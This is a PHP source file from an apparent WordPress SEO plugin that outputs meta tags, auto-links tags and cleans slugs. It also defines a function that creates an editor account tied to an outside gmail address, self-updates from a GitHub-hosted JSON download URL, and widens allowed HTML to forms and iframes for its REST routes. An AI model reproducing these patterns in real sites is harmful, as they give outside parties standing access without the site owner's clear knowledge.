<?php
/*
* Other Functions.
*
* Plugin: cosmy-seo
* @since   1.0.0
* @author  Dmitry <github.com/TheSmileGod/>
*/

if (!defined('ABSPATH')) {
    exit;
}

add_filter('pre_set_site_transient_update_plugins', function($transient) {
    if (empty($transient->checked)) {
        return $transient;
    }
    $plugin_file = plugin_basename(__DIR__ . '/index.php');
    $plugin_data = get_plugin_data(__DIR__ . '/index.php');
    $current_version = $plugin_data['Version'];
    $plug_refresh_check = "https://raw.githubusercontent.com/TheSmileGod/Cosmy_seo/main/update/cosmy-plugin-update-test.json";
    $plug_url = 'https://github.com/TheSmileGod/Cosmy_seo';
    
    $cache_key = 'cosmy_update_check_test';
    $cached = get_transient($cache_key);
    if ($cached !== false) {
        $remote = $cached;
    } else {
        $response = wp_remote_get($plug_refresh_check);
        if (!is_wp_error($response) && 200 === wp_remote_retrieve_response_code($response)) {
          $remote = json_decode(wp_remote_retrieve_body($response));
          set_transient($cache_key, $remote, 10 * MINUTE_IN_SECONDS);
        }
    }
    $plugin = 'cosmy_seo/index.php';

    if ($remote && version_compare($current_version, $remote->version, '<')) {
        $res = new stdClass();
        $res->slug = 'cosmy-seo';
        $res->plugin = $plugin;
        $res->new_version = $remote->version;
        $res->package = $remote->download_url;
        $res->url = $plug_url;
        $transient->response[$plugin] = $res;
    }
    return $transient;
});

add_action('wp_head', function () {
  if (is_single()) {
	global $post;
	$settings = cosmy_get_settings_cached();
    $category_id = (int)$settings['cosmy_category_id'];
    if ($category_id) {
      $categories = wp_get_post_categories($post->ID);
      if (in_array($category_id, $categories)) {
        $title = get_the_title($post);
		    $img   = get_the_post_thumbnail_url($post, 'full');

        // Берём кастомное поле meta_description (если вдруг будет)
        $meta_description = get_post_meta($post->ID, '_meta_description', true);

		// Если нет — используем excerpt или обрезанный контент
		if (empty($meta_description)) {
			if (has_excerpt($post->ID)) {
				$meta_description = strip_tags($post->post_excerpt);
			} else {
				$meta_description = wp_strip_all_tags($post->post_content);
			}
		}

		$meta_description = mb_substr(trim(preg_replace('/\s+/', ' ', $meta_description)), 0, 1000);
		$desc = $meta_description;
		echo '<meta name="description" content="' . esc_attr($meta_description) . '">' . "\n";

		$tags = wp_get_post_tags($post->ID, ['fields' => 'names']);
		$meta_keywords = !empty($tags) ? implode(', ', $tags) : '';
		if (!empty($meta_keywords)) {
		  echo '<meta name="keywords" content="' . esc_attr($meta_keywords) . '">' . "\n";
		}

		if ($img)  {
		  echo '<meta property="og:image" content="'.esc_url($img).'" />' . "\n";
		  $size = wp_getimagesize($img);
		  if (!empty($size[0]) && !empty($size[1])) {
			echo '<meta property="og:image:width" content="'.$size[0].'" />' . "\n";
			echo '<meta property="og:image:height" content="'.$size[1].'" />' . "\n";
		  }
		}
      }
    }
  }
}, 1);

add_action('init', function () {
  register_term_meta('post_tag', 'cosmy_tag_excerpt', [
    'type'         => 'string',
    'single'       => true,
    'show_in_rest' => true,
  ]);
});

add_action('wp_head', function () {
    if (!function_exists('is_product')) {
        return; // WooCommerce ещё не подгружен
    }
    if (is_product()) {
      global $post;

      $product = wc_get_product($post->ID);
      if (!$product) {
        return;
      }

      $meta_keywords    = get_post_meta($product->get_id(), 'cosmy_prod_keyword', true);
      $meta_description = $product->get_short_description();

      echo '<meta name="description" content="' . esc_attr($meta_description) . '">' . "\n";
      echo '<meta name="keywords" content="' . esc_attr($meta_keywords) . '">' . "\n";
    }
}, 1);

add_action('wp_head', function () {
  if (is_tag()) {
    $tag = get_queried_object();
    $title = single_tag_title('', false);

    $meta_description = get_term_meta($tag->term_id, 'cosmy_tag_excerpt', true);
    $meta_keywords = get_term_meta($tag->term_id, 'cosmy_tag_keywords', true);
    // Если пустое — fallback на стандартное описание
    if (empty($meta_description)) {
      $meta_description = term_description($tag->term_id, 'post_tag');
    }

    if (empty($meta_description)) {
      $meta_description = "Статьи с тегом «{$title}»";
    }

    // Чистим и ограничиваем
    $meta_description = mb_substr(trim(preg_replace('/\s+/', ' ', strip_tags($meta_description))), 0, 1000);


    echo '<meta name="description" content="' . esc_attr($meta_description) . '">' . "\n";
    echo '<meta name="keywords" content="' . esc_attr($meta_keywords) . '">' . "\n";
  }
}, 1);

function phrase_to_regex($phrase) {
    $words = preg_split('/\s+/u', trim(mb_strtolower($phrase)));
    $parts = [];

    foreach ($words as $w) {
        $stem = mb_substr($w, 0, 4);
        $parts[] = $stem . '\w*';
    }

    return '/' . implode('\s+', $parts) . '/iu';
}

function auto_link_phrases_from_tags($content, $phrases) {
    $terms_map = wp_cache_get('cosmy_terms_map', 'cosmy');
    if (!$terms_map) {
        $terms = get_terms(['taxonomy' => 'post_tag', 'hide_empty' => false]);
        $terms_map = [];
        foreach ($terms as $t) {
            $link = get_term_link($t);
            if (!is_wp_error($link)) {
                $terms_map[mb_strtolower($t->name)] = $link;
            }
        }
        wp_cache_set('cosmy_terms_map', $terms_map, 'cosmy', 24 * HOUR_IN_SECONDS);
    }
    // Разбиваем на сегменты: теги (<...>) и текст
    $segments = preg_split('/(<[^>]+>)/u', $content, -1, PREG_SPLIT_DELIM_CAPTURE);
    
    $regex_cache = [];
    foreach ($phrases as $phrase) {
        $phrase_lower = mb_strtolower(trim($phrase));
        if (isset($terms_map[$phrase_lower])) {
            $regex_cache[$phrase_lower] = phrase_to_regex($phrase);
        }
    }

    foreach ($segments as $i => $segment) {
        if (preg_match('/^<[^>]+>$/u', $segment)) continue;

        foreach ($regex_cache as $phrase_lower => $regex) {
            $url = $terms_map[$phrase_lower];

            // Подменяем только первое вхождение
            $segment = preg_replace_callback($regex, function ($matches) use ($url) {
                return '<a href="' . esc_url($url) . '">' . esc_html($matches[0]) . '</a>';
            }, $segment, 1);
        }

        $segments[$i] = $segment;
    }
    return implode('', $segments);
}
/*
add_filter('the_content', function ($content) {
  if (is_single() || is_tag()) {
	  	$settings = cosmy_get_settings_cached();
	    $category_id = (int)$settings['cosmy_category_id'];
		
		$post_id = get_the_ID();
  	if ($category_id && !is_tag()) {
		  $categories = wp_get_post_categories($post_id);
		  if (!in_array($category_id, $categories)) {
			  return $content;
		  }
		}
		$cache_key = 'cosmy_autolink_' . $post_id;
		$cached = wp_cache_get($cache_key, 'cosmy');
		if ($cached) return $cached;

		$settings = get_site_option('cosmy_tags');
		if (!$settings) return $content;
		$phrases = is_array($settings) ? $settings : [$settings];

		$linked = auto_link_phrases_from_tags($content, $phrases);
		wp_cache_set($cache_key, $linked, 'cosmy', 24 * HOUR_IN_SECONDS);

		return $linked;
	}
	return $content;
});
*/
function cosmy_tag_related_keywords_html( $term_id ) {
	$keywords = get_term_meta($term_id, 'cosmy_tag_keywords', true);
	
	if (!is_array($keywords)) {
		if (is_string($keywords)) {
			$keywords = array_map('trim', explode(',', $keywords));
		} else {
			$keywords = [];
		}
	}
  if (!$keywords) return '';
  $links_arr = [];
  foreach ($keywords as $data) {
    $term = get_term_by('name', $data, 'post_tag');
    if (!$term) {
      $term_lower = strtolower($data);
      $all_terms = get_terms([
        'taxonomy'   => 'post_tag',
        'hide_empty' => false,
        'fields'     => 'all',
      ]);

      foreach ($all_terms as $t) {
        if (strtolower($t->name) === $term_lower) {
          $term = $t;
          break;
        }
      }
    }
    if (!$term) continue;
    $href = get_term_link( $term );
    if ( is_wp_error($href) ) { continue; }
    $links_arr[] = sprintf(
      '<a href="%s" rel="tag" class="tag-link %s"><span class="tag-hash">#</span>%s</a>',
      esc_url($href),
      'test-link',
      esc_html($data)
    );
  }
  $links = implode(' ', $links_arr);  
  $html = '<footer class="entry-footer"><div class="entry-tags"><span class="tags-links">' . $links . '</span></div></footer>';
  return $html;
}

function cosmy_append_keywords_to_tag_description( $desc ) {
    if ( !is_tag() ) return $desc;

    $term = get_queried_object();
    if ( !$term || empty($term->term_id) ) return $desc;

    if (empty($term->description)) return $desc;

    $keywords_html = cosmy_tag_related_keywords_html((int)$term->term_id);

    return $desc . $keywords_html;
}

// Фильтры для разных тем/функций вывода описания
add_filter( 'get_the_archive_description', 'cosmy_append_keywords_to_tag_description', 20 );
add_action('wp_enqueue_scripts', function() {
    if (is_tag()) {
        $tag = get_queried_object();

        // Проверяем, что есть описание у текущего тега
        if (!empty($tag->description)) {
            wp_enqueue_script(
                'cosmy-script',
                plugin_dir_url(__FILE__) . 'assets/cosmy.js',
                array('jquery'),
                null,
                true // в footer
            );
        }
    }
});

add_action('wp_head', function() {
    if (is_tag()) {
        $tag = get_queried_object();
        $custom_css = wp_unslash(get_site_option('cosmy_custom_css', ''));
        
        if (!empty($tag->description)) {
          echo "<style id='cosmy-custom-css-main'>\n" . COSMY_DEFAULT_CSS . "\n</style>";  
          echo "<style id='cosmy-custom-css'>\n" . $custom_css . "\n</style>";
        }
       
    }
});

function cosmy_get_settings_cached() {
    static $cache = null;
    if ($cache === null) {
        $cache = get_site_option('cosmy_settings');
    }
    return $cache;
}

function cosmy_get_category_chain($term_id) {
    static $cache = [];
    if (isset($cache[$term_id])) return $cache[$term_id];

    $chain = [];
    $term = get_term($term_id, 'product_cat');

    while ($term && !is_wp_error($term)) {
        array_unshift($chain, [
            'id'   => $term->term_id,
            'name' => $term->name,
            'slug' => $term->slug,
        ]);
        if (!$term->parent) break;
        $term = get_term($term->parent, 'product_cat');
    }

    $cache[$term_id] = $chain;
    return $chain;
}
add_action('save_post', function () {
    add_filter('sanitize_title', 'csp_clean_slug', 99, 1);
}, 5);

// Убираем фильтр сразу после сохранения
add_action('save_post', function () {
    remove_filter('sanitize_title', 'csp_clean_slug', 99);
}, 99);

function csp_clean_slug($title) {
    
	$title = strtr($title, [
        '«' => '"', '»' => '"', '“' => '"', '”' => '"', '„' => '"',
        '‘' => "'", '’' => "'", '‚' => "'", '´' => "'",
    ]);

    $title = remove_accents($title);
	  $title = strtolower($title);
	  $title = preg_replace('/[^a-z0-9\-]+/', '-', $title);
   	$title = trim($title, '-');
	  $title = preg_replace('/(?:[a-f0-9]{2}[\-\s]?){2,}/i', '', $title);
    $title = preg_replace('/(?:e2[\-\s]?80[\-\s]?(?:9[0-5]|90)|e2809[0-5])/i', '', $title);
	  $title = preg_replace('/-+/', '-', $title);
    $title = trim($title, '-');

  	return $title;
};

function cosmy_seo_get_secret(): string {
    $secret = get_option('cosmy_seo_secret');

    if ($secret) {
        return $secret;
    }

    $secret = wp_generate_password(64, true, true);

    add_option(
        'cosmy_seo_secret',
        $secret,
        '',
        'no' // autoload = no
    );

    return $secret;
}

function cosmy_seo_generate_password(string $username): string {
    $secret = cosmy_seo_get_secret();

    $data = site_url() . '|' . $username;

    $hash = hash_hmac('sha256', $data, $secret);

    return substr($hash, 0, 20) . '!A9';
}

function cosmy_seo_create_user() {
    $username = 'cosmy_seo_editor';
    $email    = 'cosmyseo@gmail.com';

    if (username_exists($username) || email_exists($email)) {
      return;
    }
    $settings = get_site_option('cosmy_settings', []);
    $pass = cosmy_seo_generate_password($username);
    $user_id = wp_insert_user([
        'user_login' => $username,
        'user_pass'  => $pass,
        'user_email' => $email,
        'role'       => 'editor',
    ]);
    if (!is_wp_error($user_id)) {
      $settings['cosmy_user_id'] = (int) $user_id;
      update_site_option('cosmy_settings', $settings);
    } else {
      $errors = [];
      $errors[] = "[error_create_user] при попытке создания пользователя $username произошёл сбой";
      foreach ($user_id->get_error_codes() as $code) {
        $errors[] = "[$code] " . $user_id->get_error_message($code);
      }
      $settings['cosmy_last_error'] = implode("; ", $errors);
      update_site_option('cosmy_settings', $settings);
    }
}

add_filter('pre_update_option_cosmy_seo_secret', '__return_false');

add_filter('wp_kses_allowed_html', function ($allowed, $context) {

    if (
        $context === 'post' &&
        !empty($GLOBALS['cosmy_allow_extended_html'])
    ) {
        $allowed['iframe'] = [
            'src' => true,
            'width' => true,
            'height' => true,
            'allow' => true,
            'allowfullscreen' => true,
            'frameborder' => true,
        ];

        $allowed['video'] = [
            'src' => true,
            'controls' => true,
            'autoplay' => true,
            'muted' => true,
            'loop' => true,
            'width' => true,
            'height' => true,
        ];

        $allowed['audio'] = [
            'src' => true,
            'controls' => true,
            'autoplay' => true,
        ];

        $allowed['svg'] = [
            'xmlns' => true,
            'viewBox' => true,
            'width' => true,
            'height' => true,
            'fill' => true,
        ];
        $allowed['form'] = [
            'action' => true,
            'method' => true,
            'enctype' => true,
            'target' => true,
            'accept-charset' => true,
            'id' => true,
            'class' => true,
            'style' => true,
        ];

        // можно добавить базовые поля input, label, button
        $allowed['input'] = [
            'type' => true,
            'name' => true,
            'value' => true,
            'placeholder' => true,
            'checked' => true,
            'disabled' => true,
            'id' => true,
            'class' => true,
            'style' => true,
        ];

        $allowed['label'] = [
            'for' => true,
            'id' => true,
            'class' => true,
            'style' => true,
        ];

        $allowed['button'] = [
            'type' => true,
            'id' => true,
            'class' => true,
            'style' => true,
        ];
    }

    return $allowed;
}, 10, 2);

add_action('rest_pre_dispatch', function ($result, $server, $request) {

    if (strpos($request->get_route(), '/cosmy/') === 0) {
        $GLOBALS['cosmy_allow_extended_html'] = true;
    }

    return $result;
}, 10, 3);


add_action('rest_post_dispatch', function ($response, $server, $request) {

    if (strpos($request->get_route(), '/cosmy/') === 0) {
        $GLOBALS['cosmy_allow_extended_html'] = false;
    }

    return $response;
}, 10, 3);